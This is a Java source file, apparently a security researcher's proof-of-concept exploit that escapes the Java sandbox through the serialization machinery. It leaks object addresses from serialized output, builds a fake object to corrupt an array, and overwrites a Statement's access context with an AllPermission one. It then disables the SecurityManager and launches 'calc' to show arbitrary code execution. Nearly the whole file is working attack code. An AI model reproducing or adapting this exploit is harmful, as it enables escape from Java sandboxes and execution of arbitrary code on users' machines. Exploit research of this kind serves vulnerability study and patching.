
import java.io.*;
import java.util.concurrent.locks.*;
import java.beans.Statement;
import java.security.*;

public class TestDeserialize implements Serializable {
	
	public class MainThread extends Thread {
		TestDeserialize t_;
		Thread1 thread1_;
		
		MainThread(TestDeserialize t) {
			t_ = t;
		}
		
		public void run() {
			t_.runMainThread();
		}
	}
	
	public class Thread1 extends Thread {
		TestDeserialize t_;
		
		Thread1(TestDeserialize t) {
			t_ = t;
		}
		
		public void run() {
			t_.runThread1();
		}
	}
	
	public class Thread2 extends Thread {
		TestDeserialize t_;
		
		Thread2(TestDeserialize t) {
			t_ = t;
		}
		
		public void run() {
			t_.runThread2();
		}
	}
	
	public class Thread3 extends Thread {
		TestDeserialize t_;
		
		Thread3(TestDeserialize t) {
			t_ = t;
		}
		
		public void run() {
			t_.runThread3();
		}
	}
	
	private MyClass myclass_;
	private MyClass myclass2_;
	private Class2 mysubclass_;
	ObjectOutputStream out_;
	ByteArrayOutputStream  byteStream_;
	ByteArrayInputStream bin_;
	private static boolean b1 = false, b2 = false;
	private static Lock lock1 = new ReentrantLock();  
    private static Condition condition1 = lock1.newCondition();   
    
    private static Lock lock2 = new ReentrantLock();  
    private static Condition condition2 = lock2.newCondition();   
    
    private BigClass bigclass_;
    private int[] arr_;
    
    private int myclass2Addr_ = 0;
    private int head1_ = 0, head2_ = 0;
    private Object[] oo_;
	
	public TestDeserialize() {
		
		
		try {
			String name = "setSecurityManager";
    		Object[] o1 = new Object[1];
    		Object o2 = new Statement(System.class, name, o1); // make a dummy call for init
    		
			byteStream_ = new ByteArrayOutputStream (8192);
			out_ = new ObjectOutputStream(byteStream_);
			
			myclass_ = new MyClass();
			myclass2_ = new MyClass();
		
			arr_ = new int[4];
			
			oo_ = new Object[7];

			oo_[2] = new Statement(System.class, name, o1);

			// create powerful AccessControlContext
			Permissions ps = new Permissions();
			ps.add(new AllPermission());	

				 
			oo_[3] = new AccessControlContext(
	        			new ProtectionDomain[]{
	           			 new ProtectionDomain(
	             			   new CodeSource(
	                 		   new java.net.URL("file:///"), 
	                  		  new java.security.cert.Certificate[0] 
	                		),
	                	ps
	           	 )
	        	}
	    		);
		
	    
	// store System.class pointer in oo[]
			oo_[4] = ((Statement)oo_[2]).getTarget();	
			
			myclass_.setPointer(myclass2_);
			
			
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	public static void notifyMainThread() {
		lock1.lock();
		try {
			b1 = true;
			condition1.signal();
		} finally {
			lock1.unlock();
		}
	}
	
	public static void waitThread1() {
		lock1.lock();
		while ( !b1 ) {
			try {
				condition1.await();
			} catch (InterruptedException e) {
				
			}
		}
		
		b1 = false;
	}
	
	
	public void startThread2() {
		try {
			
			Thread2 t2 = this.new Thread2(this);
			t2.start();
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void startThread3() {
		try {
			
			Thread3 t3 = this.new Thread3(this);
			t3.start();
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void runMainThread() {
		waitThread1();
		try { Thread.sleep(1000);} catch(Exception e) {}
		
		startThread2();
		
		
		waitThread1();
		try { Thread.sleep(1000);} catch(Exception e) {}
		
		startThread3();
		
		
		try { Thread.sleep(1000000);} catch(Exception e) {}
	}
	
	public void runThread2() {
		try {
			// stage1: leak memory
			bigclass_ = new BigClass();
			out_.writeObject(bigclass_);
			
			
		} catch (Exception e) {
			
		}
	}
	
	public void runThread3() {
		try {
			
			Class2 obj = new Class2();
			out_.writeObject(obj);
			
			
		} catch (Exception e) {
			
		}
	}
	
	public int readInt(byte[] buf, int off) {
		
		int result = 0;
		
		result = ((int)(buf[off] & 0xff) << 24 ) | 
				((int)(buf[off + 1] & 0xff) << 16 ) |
				((int)(buf[off + 2] & 0xff) << 8 ) | 
				((int)(buf[off + 3] & 0xff));
		
		
		return result;
	}
	
	public void runThread1() {
		
		
		try {
			// stage1: leak memory
			
			
			out_.writeObject(myclass_);
			
			/*
			try {
			      OutputStream output = null;
			      try {
			        output = new BufferedOutputStream(new FileOutputStream("D:\\D\\work_space\\TestDeserialize\\bin\\1.bin"));
			        output.write(byteStream_.toByteArray());
			      }
			      finally {
			        output.close();
			      }
			    }
			    catch(FileNotFoundException ex){
			      
			    }
			    catch(IOException ex){
			      
			    }*/
			
			
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		byte[] buf = byteStream_.toByteArray();
		
		for ( int i = 0; i < buf.length - 16; ++ i ) {
			if ( buf[i] == 0x45 && buf[i+1] == 0x45 && buf[i+2] == 0x45 && buf[i+3] == 0x45 ) {
				i += 4;
				System.out.println(i);
				myclass2Addr_ = readInt(buf, i);
				head1_ = readInt(buf, i + 4);
				head2_ = readInt(buf, i + 8);
				break;
			}
		}
		
		if ( 0 == myclass2Addr_ || 0 == head1_ || 0 == head2_ ) {
			System.out.println( "Failed to leak memory!" );
			return;
		}
		
		System.out.println( "myclass2Addr_: " + String.format("%08x", myclass2Addr_) );
		System.out.println( "head1_: " + String.format("%08x", head1_) );
		System.out.println( "head2_: " + String.format("%08x", head2_) );
		
		myclass2_.i4_ = head1_;
		myclass2_.i5_ = head2_;
		
		// stage2: create fake object
		try {
			Class1 obj = new Class1(myclass2Addr_ + 0x14);
			out_.writeObject(obj);
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		System.out.println( "arr_.length = " + arr_.length );
		
		 boolean found = false;
	        int ooLen = oo_.length;
	        for(int i=6; i < arr_.length; i++)
	                if (arr_[i-1]==ooLen && arr_[i]==0 && arr_[i+1]==0 // oo[0]==null && oo[1]==null
	                 && arr_[i+2]!=0 && arr_[i+3]!=0 && arr_[i+4]!=0   // oo[2,3,4] != null    
	                 && arr_[i+5]==0 && arr_[i+6]==0)               // oo[5,6] == null
	                {
	                    // read pointer from oo[4]
	                    int stmTrg = arr_[i+4];
	                    // search for the Statement.target field behind oo[]
	                    for(int j=i+7; j < i+7+64; j++){
	                        if (arr_[j] == stmTrg) {
	                            // overwrite default Statement.acc by oo[3] ("AllPermission")
	                        	arr_[j-1] = arr_[i+3];
	                            found = true;
	                            break;
	                        }
	                    }
	                    if (found) break;
	                }

	            // check results 
	            if (!found) {
	                System.out.println( "Failed to find object array!" );
	            } else try {
	                // show current SecurityManager
	                System.out.println("Security Manager = " + System.getSecurityManager());		

	                // call System.setSecurityManager(null)
	                ((Statement)oo_[2]).execute();	

	                // show results: SecurityManager should be null
	                System.out.println("Security Manager = " + System.getSecurityManager());
	                
	                Runtime.getRuntime().exec( "calc" );
	            } catch (Exception ex) {
	                ex.printStackTrace();
	            } 
			
	}
	

	
	
	public static void main(String[] args) {
		
		
		TestDeserialize t = new TestDeserialize();
		MainThread mainThread = t.new MainThread(t);
		Thread1 thread1 = t.new Thread1(t);
		
		mainThread.start();
		thread1.start();
		
	}
}
